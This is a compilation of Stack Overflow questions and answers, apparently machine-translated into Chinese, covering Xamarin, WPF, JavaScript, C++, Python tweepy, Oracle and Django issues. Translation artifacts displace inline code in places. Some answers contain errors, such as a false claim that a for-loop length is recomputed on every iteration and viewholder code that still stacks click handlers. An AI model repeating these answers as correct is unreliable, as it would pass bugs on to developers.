> 标签：android, android-listview, mono, xamarin.android, xamarin

我有一个设置了 ArrayAdapter 的 ListView，并且适配器中的每一行都包含四个需要接收和处理单击事件的按钮。通常在 Android 中，我会`SetOnClickListener`在创建单元格时调用每个按钮，但 Mono 提供了为事件设置事件处理程序的能力`Click`。不过，在 Mono 中似乎有些奇怪，因为我遇到了两个问题之一，具体取决于我设置事件处理程序的位置。

ArrayAdapter GetView 示例 1：

```
View tweetCell = convertView;
if (tweetCell == null) {
    tweetCell = ((LayoutInflater)Context.GetSystemService (Context.LayoutInflaterService)).Inflate (Resource.Layout.TweetCell, null);

    tweetCell.FindViewById (Resource.Id.btn_moveTweet).Click += (object sender, EventArgs e) => MoveTweet (GetItem(position));

    tweetCell.FindViewById (Resource.Id.btn_unfavoriteTweet).Click += (object sender, EventArgs e) => UnfavoriteTweet (GetItem(position));

    tweetCell.FindViewById (Resource.Id.btn_hideTweet).Click += (object sender, EventArgs e) => HideTweet (GetItem(position));

    tweetCell.FindViewById (Resource.Id.btn_shareTweet).Click += (object sender, EventArgs e) => ShareTweet (GetItem(position));
} 
```

在这里，我的事件处理程序每​​个按钮只设置一次（好！），但`position`大多数时候该值是错误的。我想知道从 Mono 到 Android 代码的转换是否导致每次都`GetItem(position)`使用相同的值（首次创建单元格时设置的值）。此代码在普通 Android 中完全可以正常工作。`position``position`

ArrayAdapter GetView 示例 2：

```
View tweetCell = convertView;
if (tweetCell == null) {
    tweetCell = ((LayoutInflater)Context.GetSystemService (Context.LayoutInflaterService)).Inflate (Resource.Layout.TweetCell, null);
}
tweetCell.FindViewById (Resource.Id.btn_moveTweet).Click += (object sender, EventArgs e) => MoveTweet (GetItem(position));

tweetCell.FindViewById (Resource.Id.btn_unfavoriteTweet).Click += (object sender, EventArgs e) => UnfavoriteTweet (GetItem(position));

tweetCell.FindViewById (Resource.Id.btn_hideTweet).Click += (object sender, EventArgs e) => HideTweet (GetItem(position));

tweetCell.FindViewById (Resource.Id.btn_shareTweet).Click += (object sender, EventArgs e) => ShareTweet (GetItem(position)); 
```

此方法确实会为正确的 触发 click 事件`position`，但它会在每次回收该行时设置一个新的事件处理程序。这会同时导致很多行的点击事件。此方法的解决方法似乎是保留对事件处理程序的引用并在再次将它们设置在内部之前将其删除`GetView`，但这似乎非常不雅。

有没有更好的方法来处理 Monodroid 中 ListView 项目内的点击事件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-04-05T07:12:56.813

*我知道它是一个旧线程，但它有很多选票并且仍然被标记为未答复*

您描述的场景发生是合乎逻辑的！它与单声道无关。它与转换视图有关。这是 convertview 文档中所说的：

> convertView - 如果可能的话，要重用的旧视图。注意：在使用之前，您应该检查此视图是否为非空且类型合适。如果无法将此视图转换为显示正确的数据，则此方法可以创建一个新视图。

**示例 1：** 在您的第一个示例中，convertView 第一次将为空，并且将设置事件。然后下次调用*GetView*方法时，convertview 可能为空，也可能不为空。如果它不为空，它将使用仍然附加事件的旧视图！所以这意味着带有位置参数的事件仍然来自以前的视图！

**示例 2：** 此示例将按预期工作，但它不像您提到的那样非常有效。每次调用*FindViewById*方法时，它都必须定位控件。

**解决方案：** 这个性能问题的解决方案是实现viewholder模式。

首先，您创建一个包含您的视图的类：

```
private class MyViewHolder : Java.Lang.Object 
{
  public Button MoveTweet { get; set; }
  public Button ShareTweet { get; set; }
  public Button UnfavoriteTweet { get; set; }
  public Button HideTweet { get; set; }
} 
```

现在你可以在你的代码中使用这个viewholder

```
public override View GetView (int position, View convertView, ViewGroup parent)
{
  MyViewHolder holder;
  var view = convertView;

  if(view != null) 
    holder = view.Tag as MyViewHolder;

  if (holder == null) {
    holder = new MyViewHolder ();
    view = activity.LayoutInflater.Inflate (Resource.Layout.OptimizedItem, null);
    holder.MoveTweet = view.FindViewById<Button> (Resource.Id. btn_moveTweet);
    holder.ShareTweet = view.FindViewById<Button> (Resource.Id. btn_shareTweet);
    holder.UnfavoriteTweet = view.FindViewById<Button> (Resource.Id. btn_unfavoriteTweetTweet);
    holder.HideTweet = view.FindViewById<Button> (Resource.Id. btn_hideTweet);
    view.Tag = holder;
  } 

  holder.MoveTweet.Click += (object sender, EventArgs e) => MoveTweet (GetItem(position));
  holder.UnfavoriteTweet.Click += (object sender, EventArgs e) => UnfavoriteTweet (GetItem(position))
  holder.HideTweet.Click += (object sender, EventArgs e) => HideTweet (GetItem(position));
  holder.FavoriteTweet.Click += (object sender, EventArgs e) => ShareTweet (GetItem(position));

  return view;
} 
```

有关此检查的更多信息：[https ://blog.xamarin.com/creating-highly-performant-smooth-scrolling-android-listviews/](https://blog.xamarin.com/creating-highly-performant-smooth-scrolling-android-listviews/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-02T09:26:00.340

试试这个代码：

```
 void OnListItemClick(object sender, AdapterView.ItemClickEventArgs e)
    {
        var listView = sender as ListView;
        var item = items[e.Position];

        //init your data...

        tweetCell.FindViewById (Resource.Id.btn_moveTweet).Click += (object sender, EventArgs e) => MoveTweet (item);
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T19:01:34.953

我也有类似的问题。显然，我会避免解决方案 2。此外，我观察到解决方案 1 中的问题只发生在 Android 2.3 上。

这就是我解决问题的方法。

`ListView`我在适配器中保留了对 的引用，例如`_listView`. 然后，在您的`GetItem()`方法中（不要错过`position`变量。它的值是一个谜），调用`_listView.GetPositionForView((View)sender)`以获取正确的位置。

# f# - 在 Xamarin Studio 4.0.3 中调试 F# 会引发错误

> ID：16215690
> 
> 赞同：7
> 
> 时间：2013-04-25T13:11:20.750
> 
> 标签：f#, monodevelop, xamarin, xamarin-studio

[我已经从http://monodevelop.com/Download](http://monodevelop.com/Download)在 Windows 8 x64 上安装了 Xamarin Studio 4.0.1 。当我运行 Xamarin 时，它已更新到 4.0.3。我已经安装了 F# 绑定。我创建了新的 F# 控制台项目。当我运行它时，它工作正常。当我设置断点并运行它时，我收到以下错误。任何想法，为什么会发生这种情况？

> System.Runtime.InteropServices.COMException (0x80070032)：不支持该请求。(Exception from HRESULT: 0x80070032) at Microsoft.Samples.Debugging.CorDebug.NativeApi.ICorDebug.CreateProcess(String lpApplicationName, String lpCommandLine, SECURITY_ATTRIBUTES lpProcessAttributes, SECURITY_ATTRIBUTES lpThreadAttributes, Int32 bInheritHandles, UInt32 dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDirectory, STARTUPINFO lpStartupInfo, PROCESS_INFORMATION lpProcessInformation, CorDebugCreateProcessFlags debuggingFlags, ICorDebugProcess& ppProcess) at Microsoft.Samples.Debugging.CorDebug.CorDebugger.CreateProcess(String applicationName, String commandLine, SECURITY_ATTRIBUTES processAttributes, SECURITY_ATTRIBUTES threadAttributes, Boolean inheritHandles, Int32 creationFlags, IntPtr environment, String currentDirectory,

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-27T09:11:02.927

Win32 调试器的问题是我们不支持 x64 调试。尝试以 32 位调试应用程序，它会工作。

我们需要实现远程调试，也就是生成一个 64 位调试器，这样我们就可以调试一个 64 位应用程序。我们使用 MDbg 作为后端。

另请检查：http: [//blogs.msdn.com/b/jmstall/archive/2006/03/08/debugging-cross-platform.aspx](http://blogs.msdn.com/b/jmstall/archive/2006/03/08/debugging-cross-platform.aspx)

# wpf - 在 WPF 中将 KeyBinding 转换为 MouseBinding

> ID：16215691
> 
> 赞同：1
> 
> 时间：2013-04-25T13:11:20.630
> 
> 标签：wpf, xaml

我正在使用 DataGrid。

我目前有以下 XAML：

```
<dg:DataGrid lc:DataGridPackage.QueryGrid="{Binding myGrid}">
    ...
    <dg:DataGrid.Resources>
        <lc:CommandReference x:Key="myCommand" Command="{Binding myCommandActionItem}" />
    </dg:DataGrid.Resources>

    <dg:DataGrid.InputBindings>
        <KeyBinding Modifiers="Control" Key="D" Command="{StaticResource myCommand}" /> 
```

它工作正常。我单击数据网格中的一行，按 Ctrl+D 并执行命令（在本例中，刷新一行）。

但是，如果我将 KeyBinding 更改为 MouseBinding：

```
<MouseBinding MouseAction="LeftDoubleClick" Command="{StaticResource myCommand}"> 
```

我收到错误“无法在“MouseBinding”类型的“命令”属性上设置“绑定”。只能在 DependencyObject 的 DependencyProperty 上设置“绑定”。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:18:02.810

尝试这个：

```
<MouseBinding MouseAction="LeftDoubleClick" Command="{StaticResource myCommand}" /> 
```

您不能在 Command 属性上使用绑定标记扩展。正如错误所说，Command 不是 DependencyProperty。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:28:39.770

为什么不将每个事件都处理为行为中的绑定情况？通过这种方式，您可以轻松分配事件、检查修改器并向视图模型发送命令。

如果您愿意，我可以为这种情况提供一些代码。

# javascript - ECMAscript 中的 switch-case 性能

> ID：16215696
> 
> 赞同：7
> 
> 时间：2013-04-25T13:11:32.633
> 
> 标签：javascript, switch-statement, v8, ecmascript-5, spidermonkey

我`switch-case`在 ECMAscript 中使用常规基础上的语句。除了我个人对此的认可之外，还有大量的专业文献，关于这种语言的一般性能，特别是关于*条件*语句。

例如，我记得的一个很好的例子是 Nicholas Zakas 的优秀书籍“*高性能 Javascript* ”。就像在许多其他书籍和文章中一样，当您使用*两个*以上的条件案例时，据说`switch-case`语句总是比语句快。`if (else)`

 *在我所知道的任何*类 C*`switch-case`语言中，语句只不过是一个二进制哈希映射，它再次分解，是汇编中的*jmp 代码链。*[在这里](http://en.wikipedia.org/wiki/Switch_statement)好好阅读

然而，在这个前言之后：

我与我的团队讨论了*事件处理函数*的使用以及我们将如何处理事件类型。无论我们是否要为任何事件使用显式*函数*，或者我们是否应该使用一个处理多种*事件类型的**大*函数。在那次讨论中，性能问题出现了，我们创建了一个非常基本、简单的*jsPerf*：

 **[http://jsperf.com/engine-context-data-caching-test/3](http://jsperf.com/engine-context-data-caching-test/3)

我对结果和我所看到的感到非常震惊。相信这些测试用例，*顺序*对`case statements`执行性能非常重要。`long`和那里的区别`longSlow`，只是语句在语句中的*位置*。这是真实的和合理的吗？`case 'baz'``switch`

我有没有可能忽略一些东西？首先，我想得很好，也许它的语句不够多`case`，解释器只会在幕后创造`if-else`条件，所以我增加了数量，结果没有任何变化。

我只是拒绝相信像*V8*和*spidermonkey*这样的 ECMAscript 引擎仍然没有优化这个问题。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-25T13:43:41.193

我引用这个来源：http: [//oreilly.com/server-administration/excerpts/even-faster-websites/writing-efficient-javascript.html#sect2](http://oreilly.com/server-administration/excerpts/even-faster-websites/writing-efficient-javascript.html#sect2)

**在以下情况下使用 if 语句：**

*   要测试的离散值不超过两个。

*   有大量的值可以很容易地分成范围。

**在以下情况下使用 switch 语句：**

*   要测试的离散值多于两个但少于 10 个。

*   条件没有范围，因为这些值是非线性的。

**在以下情况下使用数组查找：**

*   要测试的值超过 10 个。

*   条件的结果是单个值，而不是要采取的许多操作。***

# c++ - 使用指针缓慢迭代字符串

> ID：16215699
> 
> 赞同：2
> 
> 时间：2013-04-25T13:11:44.690
> 
> 标签：c++, performance, algorithm, profiling, std

我很想知道为什么以下解决方案之一比另一个慢得多。让我们考虑以下代码：

```
// create a very long string
int x,y;
bool b;
char c[10000];

for (x=0;x<10000;x++)
    c[x]='a';
string s(c); 
```

现在我想遍历字符串并将每个字符与其他字符进行比较。第一个解决方案在 5 秒内完成任务：

```
for (y=0;y<100000;y++){
for (x=0;x<10000;x++){
    b = (s[x]=='a');
}} 
```

以及 21 秒内的第二个：

```
string::iterator begin = s.begin();
string::iterator end   = s.end();
string::iterator i;

for (y=0;y<100000;y++){
    for (i=begin;i<end;i++){
        b = (*i=='a');
}} 
```

为什么第二个这么慢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-29T15:47:17.470

It is having to dereference a pointer every time you are comparing your iterator to 'a', instead of just comparing the actual char value. This is a negligible difference in most cases, but with it doing 1,000,000,000 iterations it is noticeable.

# windows - C 的 Visual Studio 手册页

> ID：16215701
> 
> 赞同：0
> 
> 时间：2013-04-25T13:11:45.190
> 
> 标签：windows, visual-studio-2012, manpage

当 Windows 开发人员需要查找典型 C 函数的手册页时，他们会怎么做？例如，假设我正在 Visual Studio 中编写一些 C 代码，我需要记住参数的顺序和 strcpy 的确切行为。请注意，我并不是要复制我的 Linux/OS X 经验，而是要为典型的 Windows 开发人员发现获取此信息的最简单、最常用的方法。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:16:50.160

对于那个特定的问题，我会保留[这个按字母顺序排列的函数列表](http://msdn.microsoft.com/en-us/library/634ca0c2%28v=vs.100%29.aspx)。您也可以在 VS 中本地安装此（和其他 VC++）文档。

# javascript - 这些 for 循环有什么不同吗？

> ID：16215707
> 
> 赞同：0
> 
> 时间：2013-04-25T13:11:55.783
> 
> 标签：javascript, for-loop

这是代码

示例 1

```
for (var k = 0, l = value.length; k < l; k++, index++) {
    // ...
} 
```

示例 2

```
var l = value.length;
for (var k = 0; k < l; k++, index++) {
    // ...
} 
```

在示例 1 中，变量 l 定义在“for”括号内，这是否意味着每次循环通过时都定义了 l？如果是这样，那么示例 2 会更有效吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T13:14:07.387

它们的速度相等。没什么不同。

但我建议您使用示例 2，因为它更好地阅读。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T13:16:14.827

片段中没有效率差异。

在第一个片段中 l = value.length 被调用一次。就像 k = 0

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T13:14:23.170

两者完全一样，没有区别。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-07-16T18:06:53.630

相同的代码，使用第二个代码以提高可读性

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-08-29T08:55:12.157

我对这里给出的答案感到惊讶。

示例 1 是许多书籍和文章中提到的众所周知的反模式。它在每个循环中重新计算 l。根据您在 for-call 中放置的这个（或任何其他不必要的）操作的成本（第一个参数除外），代码可能需要更长的时间来执行。

示例 2 更好，因为 的值`l`只计算一次并被缓存。缓存是一个非常重要的概念，这个简单的例子演示了它。即使您`value`在循环内部进行更改，它也会起作用，而第一个示例可能会导致意外结果。

在我看来，使用示例 1 的唯一可能原因是当您*确实需要*为每个循环重新计算`l`时，例如当循环更改`value`并且您确实想要更新时`l`。

# python - 多重继承问题，在类中添加threading.Thread

> ID：16215709
> 
> 赞同：0
> 
> 时间：2013-04-25T13:11:56.627
> 
> 标签：python, multithreading, twitter, multiple-inheritance, tweepy

首先让我解释**一下我想要做什么**：

**基本概述**：在一个类中从 twitter 获取数据并在另一个类中打印。
**Little Deeper：**我希望`CustomStreamListener`能够作为单独的线程运行。并且每一个状态，我得到的`on_status`方法都放在一个队列中。比`Twitter()`班级将队列拉出并打印出来。

现在**我不明白**：

*   我应该投入什么`run()`功能？（它应该打电话`on_status()`吗？）
*   如果一切都很好，`CustomStreamListener`我应该怎么称呼它？（为了让我在没有我的情况下调用这个类，`Thread`我应该做这样的事情：

    ```
     l = CustomStreamListener()
        stream = tweepy.streaming.Stream(self.auth,l)
        stream.filter(follow=None, track=hashtag) 
    ```

*   现在，如果我想打电话`threading.Thread`，我必须`start()`在将队列拉出后的某个地方调用它。所以这部分对我来说有点混乱。

我也愿意接受任何其他方式来获得类似的结果。谢谢你。

```
 import sys, os, time
    import tweepy
    import simplejson as json
    import threading, Queue

    queue = Queue.Queue()

    #SETTINGS :

    #output = open(os.path.join(os.path.expanduser('~/'), 'sample_file.txt'), 'a')
    hashtag = ['java']

    class CustomStreamListener(tweepy.StreamListener, threading.Thread):

        def __init__(self):
            threading.Thread.__init__(self)
            self.queue = queue

        def on_status(self, status):
            try:
                # If you want to have different data from twitter just change .text to something different from tweet:
                '''
                status.text
                status.author.screen_name
                status.created_at
                status.source
                status.user.screen_name
                status.id
                status.source_url
                status.place
                '''
                time.sleep(0.15)
                data = status.text
                self.queue.put(data)

                #print json.loads(data)
                #with open(os.path.join(os.path.expanduser('~/'), 'sample_file.txt'), 'a') as output:
                #    output.write("%s\n "% data)

            except Exception, e:
                print >> sys.stderr, 'Encountered Exception:', e
                pass

        '''
        def on_data(self, data):
            d = (json.dumps(json.loads(data), indent=4, sort_keys=True))
            print d
            output.write("%s "% d)
        '''

        def on_error(self, status_code):
            print >> sys.stderr, 'Encountered error with status code:', status_code
            return True # Don't kill the stream

        def on_timeout(self):
            print >> sys.stderr, 'Timeout...'
            return True # Don't kill the stream

    class Twitter():

        def __init__(self):

            consumer_key=''
            consumer_secret=''
            access_key = ''
            access_secret = ''

            self.auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
            self.auth.set_access_token(access_key, access_secret)
            self.api = tweepy.API(self.auth)

        def start(self):
            l = CustomStreamListener()
            stream = tweepy.streaming.Stream(self.auth,l)
            stream.filter(follow=None, track=hashtag)

    if __name__ == "__main__":
        Twitter().start() 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T16:36:29.593

```
stream.filter(follow=None, track=hashtag) 
```

您想从该`run`方法调用此函数，以便在另一个线程中运行事件循环。

也许更容易`threading.Thread`直接在`Twitter.start`. 那么监听器对象就不需要知道你要传递的参数了`filter`。在这种方法中，`CustomStreamListener`不会子类化`threading.Thread`.

```
class Twitter():
    def start(self):
        l = CustomStreamListener()
        stream = tweepy.streaming.Stream(self.auth,l)
        self.listener_thread = threading.Thread(target=stream.filter, 
                                                kwargs=dict(follow=None, track=hashtag))
        self.listener_thread.start() 
```

# sql - ORA-01002: 提取乱序

> ID：16215711
> 
> 赞同：1
> 
> 时间：2013-04-25T13:12:00.537
> 
> 标签：sql, oracle, oracle11g, oracleclient

当我的应用程序仅部署在**服务器**上时，而不是在我的本地计算机上运行*完全相同的可执行文件时，我收到以下 oracle 错误：*

![在此处输入图像描述](https://i.stack.imgur.com/QO95o.png)

堆栈跟踪指向一个带有连接的简单选择语句，我可以通过本地[TOAD](http://www.quest.com/toad/)和问题服务器上的[SQL Plus成功执行该语句。](http://en.wikipedia.org/wiki/SQL*Plus)

堆栈跟踪的上半部分是：

```
Oracle.DataAccess.Client.OracleException ORA-01002: fetch out of sequence
  at Oracle.DataAccess.Client.OracleException.HandleErrorHelper(Int32 errCode, OracleConnection conn, IntPtr opsErrCtx, OpoSqlValCtx* pOpoSqlValCtx, Object src, String procedure, Boolean bCheck)
  at Oracle.DataAccess.Client.OracleException.HandleError(Int32 errCode, OracleConnection conn, IntPtr opsErrCtx, Object src, Boolean bCheck)
  at Oracle.DataAccess.Client.OracleDataReader.Read()
  at System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping) 
  at System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue)
  at System.Data.Common.DataAdapter.Fill(DataTable[] dataTables, IDataReader dataReader, Int32 startRecord, Int32 maxRecords)
  at System.Data.Common.LoadAdapter.FillFromReader(DataTable[] dataTables, IDataReader dataReader, Int32 startRecord, Int32 maxRecords)
  at System.Data.DataTable.Load(IDataReader reader, LoadOption loadOption, FillErrorEventHandler errorHandler)
  at Reconciliation.Models.Legacy.EntityDbEnvironment.OpenEntity(String sql)
  at Reconciliation.Models.Legacy.EntityDbEnvironment.Open(String& sql, DataTable& datatable)
**at myProject.Checks.ExecuteSql()** 
```

我只能想象这是一个 oracle 客户端问题，但我应该在哪里解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2017-07-19T10:32:41.850

I had that issue too. My application was working fine on a machine, and the exact same executable on another machine was getting that fetch out of sequence exception.

My query is a big one which takes a few minutes to run. It is ran by a COM+. I realised that my two environments had a slightly different Component Services configuration. The failing environment had a transaction timeout set to 60s, the other one was set to much more.

To solve this I simply had to go to Component Services, right click on My Computer, Properties, Options, and increase the Transaction timeout.

It makes sense now as the fetch out of sequence exception is happening when you try to access a closed cursor. I understand that the COM+ timeout closed the transaction, therefore the cursor, and thrown that Oracle exception.

[![Picture of the property to update](https://i.stack.imgur.com/SL3kT.png)](https://i.stack.imgur.com/SL3kT.png)

# dynamic-ip - 如何使用 C# 获取 ISP 分配的动态 IP 地址？

> ID：16215715
> 
> 赞同：-2
> 
> 时间：2013-04-25T13:12:05.983
> 
> 标签：dynamic-ip

我进行了很多搜索以获取我的 ISP 使用 C# 分配的动态 IP 地址

没有结果

那么，如何使用 C# 获取 ISP 分配的动态 IP 地址？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:35:25.250

通过查询外部网站来工作，例如；

```
lynx --dump http://ipecho.net/plain 
```

# c++ - 派生类构造函数语法 Wt

> ID：16215716
> 
> 赞同：0
> 
> 时间：2013-04-25T13:12:06.363
> 
> 标签：c++, wt

各位 C++ 程序员，您好，

今天我正在修补优秀的 Wt 框架 Wt - 一个用于开发 Web 应用程序的 C++ 库：[http](http://www.webtoolkit.eu/wt) ://www.webtoolkit.eu/wt 。

我正在缓慢但稳步地取得进步。让我感到好奇的一件事是（我对 C++ 很陌生）从基本 Wt::WContainerWidget 类派生的类的构造函数中的以下表达式：

```
class FooWidget : public Wt::WContainerWidget
{
  public:
  FooWidget(Wt::WContainerWidget *parent = 0);
  ...

  private:
  ...
};

FooWidget::FooWidget(Wt::WContainerWidget *parent = 0)
: Wt::WContainerWidget(parent)
{
  ...
}; 
```

注意：在 Wt 中，所有小部件都放置在分层树中，因此可选的 parent 参数指定将包含我们的“新生”小部件的小部件。

“:Wt::WContainerWidget(parent)”部分发生了什么？我知道构造函数中“：”后面的表达式用于初始化成员变量，但这在这里似乎没有意义，因为它只是一个类名，而不是成员名......我错过了什么重要的东西?

非常感谢和问候，

朱利安

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:15:35.673

这部分初始化列表：

```
: Wt::WContainerWidget(parent) 
```

它使用参数调用基类（`Wt::WContainerWidget`）构造函数`parent`。您可以阅读此[线程](https://stackoverflow.com/questions/120876/c-superclass-constructor-calling-rules)以获取更多详细信息。

# facebook-fql - Facebook FQL query hometown_location {city}

> ID：16215717
> 
> 赞同：1
> 
> 时间：2013-04-25T13:12:06.427
> 
> 标签：facebook-fql

I would like to create a FQL query where i would only get the `hometown_location.city` from the FQL and not all the hometown_location (array). is there a way to do it?

my current query is the following :

```
SELECT uid, hometown_location FROM user WHERE uid = me(); 
```

keep in mind that all my blank space are replaced by '+' so currently my query works.

My current result returns me an array which contain the city,state,country,zip,id and name.

The result has a little to much info for what i want to do with the result isn't there a way to only get the city?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-19T09:50:13.747

使用点运算符：“hometown_location.city”应该可以工作

所以你的查询是：

```
SELECT uid, hometown_location.city FROM user WHERE uid = me(); 
```

# ios - Copy NSArray to member variable

> ID：16215718
> 
> 赞同：0
> 
> 时间：2013-04-25T13:12:08.043
> 
> 标签：ios, objective-c, nsmutablearray, nsarray

I have a setter in my class:

```
-(void)setNumbers:(NSArray *)aNumbers{
  NSArray *tArray = [[NSArray alloc]initWithArray:aNumbers]; //throws BAD ACCESS
  self.numbers = tArray;
  //also tried self.numbers = [tArray copy];
  [tArray release];

} 
```

If I invoke the setter like this:

```
NSArray *numbers = [TicketManager getRandomNumbersFor:@"LottoNormal"];
[self.ticket setNumbers:numbers]; 
```

In the 'getRandomNumbersFor:' method (the loop gets executed):

```
+(NSArray *)getRandomNumbersFor:(NSString *)aTicketType{

  NSLog(@"getting RandomNumbers for: %@",aTicketType);
  NSMutableArray *tResult;
  if([aTicketType isEqualToString:@"LottoNormal"]){
    tResult = [NSMutableArray arrayWithCapacity:6];
    for(int i = 0;i<6;i++){
        int tNumber = arc4random() % 48;
        tNumber++;
        NSLog(@"Number: %i",tNumber);
        [tResult addObject:[NSNumber numberWithInt:tNumber]];
    }
  }

  return tResult;
} 
```

In a `ViewController` I´m getting a bad access in the marked line.
Can anyone can help?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:22:48.520

顺便问一下，为什么要写`setNumbers`setter方法呢？鉴于您定义了一个属性 ，将为您合成`numbers`一个调用的 setter 方法。`setNumbers`更糟糕的是，你的`setNumbers`电话本身！构造

```
self.numbers = tArray; 
```

相当于调用

```
[self setNumbers:tArray]; 
```

这导致无限递归。

`setNumbers`顺便说一句，除非有令人信服的理由，否则我建议不要编写自己的setter 方法。默认的 setter 做了很多很棒的事情（适当的内存管理、KVO 等），所以你应该仔细考虑用你自己的来替换它。如果可以的话，让编译器为你合成你的访问器方法（setter 和 getter）。

如果您出于某种原因必须编写自己的访问器方法，至少要确保引用实例变量，而不是访问器方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:17:14.070

self.numbers 是如何定义的？您可能不需要在这里制作自己的二传手。

而不是

```
@property (nonatomic, retain) NSArray *numbers; 
```

你可以声明是复制的：

```
@property (nonatomic, copy) NSArray *numbers; 
```

让动态设置器为您完成复制工作。这也将处理传入的 nil。

# django - Google App Engine 上 Django 的 FileField（或 ImageField）

> ID：16215726
> 
> 赞同：1
> 
> 时间：2013-04-25T13:12:36.303
> 
> 标签：django, google-app-engine, blobstore, django-storage

GAE 不允许读/写文件系统，这是 Django 的 FileField（或 ImageField）正在使用的（通过 FileSystemStorage 类）。

我正在考虑实现自定义 Django 存储，但 GAE blobstore 似乎与 Django 要求完全不兼容。具体来说，GAE blobstore 假设从客户端直接上传到存储，而 Django 自定义存储需要实现 _save(name, content) 方法。

据我所知，没有人提到这个缺失的实现。那里有一些自定义存储项目（最著名的是：BitBucket 上的 django-storages），实现了 S3、Windows Azure、许多其他后端，但对 Google 没有。

我应该采取什么方向在我的模型中拥有一个托管在 Google App Engine 上的 FileField？

澄清一下： - 我正在使用库存的主干，使用谷歌 SDK 附带的谷歌云 SQL Django 的主干 - 我没有使用 Django nonrel。- 我遵循了Google 文档中的[Django 指南](https://developers.google.com/appengine/docs/python/cloud-sql/django)。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-26T05:11:17.877

blobstore 现在支持写入文件功能。请参阅 [将文件写入 blobstore](https://developers.google.com/appengine/docs/python/blobstore/overview#Writing_Files_to_the_Blobstore)。因此现在可以实现`_save(name, content)`with blobstore。

另一种方法是使用云存储。它提供了比 blobstore 更多的功能，例如 listdir、open、delete。

[https://developers.google.com/appengine/docs/python/googlestorage/](https://developers.google.com/appengine/docs/python/googlestorage/)

# javascript - 通过图像宽度大小设置 div 包装器的高度

> ID：16215733
> 
> 赞同：-1
> 
> 时间：2013-04-25T13:12:50.763
> 
> 标签：javascript, jquery

将尝试重新解释我在这里尝试做的事情。`div`/`img`示例周围似乎有些混乱。简而言之，我想要做的是围绕一个保持为正方形的图像创建一个包装器，但随着浏览器窗口的调整，尺寸会响应地扩展。正方形内的图像也会在正方形包装 ( `div`) 内调整大小以填充空间。这些图像的宽度几乎相同，但高度各不相同，我想定位在顶部并隐藏底部以用于比方形包装更大的任何东西。因为方形包装器会随窗口调整大小，所以我无法将大小设置为实际大小`div`，但想自动调整。

希望这可以帮助。

所以这就是我想出的。这似乎在大多数情况下都有效。

```
var divWidth = $('.photo').width();
$('.photo').height(divWidth);

$(window).resize(function () {
    var divWidth = $('.photo').width();
    $('.photo').height(divWidth);
}); 
```

有人有什么建议要补充吗？

--- 原始描述 ----

我正在寻找一个带有图像的响应式网页。不幸的是，并非所有图像都具有相同的高宽比。因此正在考虑围绕图像创建一个包装器，该包装器将通过图像的当前宽度设置高度，其余部分将被隐藏。寻找最好和最简单的方法来做到这一点？

所以它的作用是创建一个 2 列的项目列表，这些项目随着浏览器的宽度而扩展。但不幸的是，由于图像大小，一些项目比其他项目高。我希望图像在一个正方形的盒子里，宽度相等，以保持一致。但我不想调整图像高度的大小，只需填充 100% 的宽度，然后在底部溢出。

CSS：

```
.listing ul {
    position: relative;
    display: block;
    padding: 0;
    margin: 0;
}

.listPeople li {
    list-style: none;
    float: left;
    position: relative;
    display: block;
    width: 48.93617020799999%;
    height: auto;
    background: #FFF;
    border: 1px solid #D0D5D8;
    padding: 12px;
    margin: 0 15px 15px 0;
}

    .listPeople li .user .photo {
        position: relative;
        display: block;
        background: #FFF;
        box-shadow: 0 1px 2px rgba(0,0,0,0.09);
        border: 1px solid #DDD;
        padding: 8px;
        margin: 0;
    }

.listing li .user .photo img {
    width: 100%;
    height: auto;
    max-width: 100%;
    vertical-align: middle;
    border: 0;
    -ms-interpolation-mode: bicubic;
    padding: 0;
    margin: 0;
}

.listing li .content {
    float: left;
    position: relative;
    display: block;
    width: 74.468085099%;
    height: 100%;
    padding: 0;
    margin: 0;
} 
```

HTML：

```
<div class="listing">
    <ul>
        <li>
            <div class="user">
                <div class="photo">
                    <a href="#"><img src="URL" /></a>
                </div>
                <a class="button">Follow</a>
            </div>
            <div class="content">
                -- normal html formatting --
            </div>
        </li>
    </ul>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:19:48.150

我会设置容器的宽度，然后只使用标签`style="max-width:100%"`上的属性。`img`

```
<p><img src="http://whiterootmedia.com/images/css_rule.jpg" alt="css rule" style="max-width:100%" /></p> 
```

这是一个例子： http: [//www.whiterootmedia.com/database/dusty_arlia/what_are_css_selectors.html](http://www.whiterootmedia.com/database/dusty_arlia/what_are_css_selectors.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-26T21:31:48.170

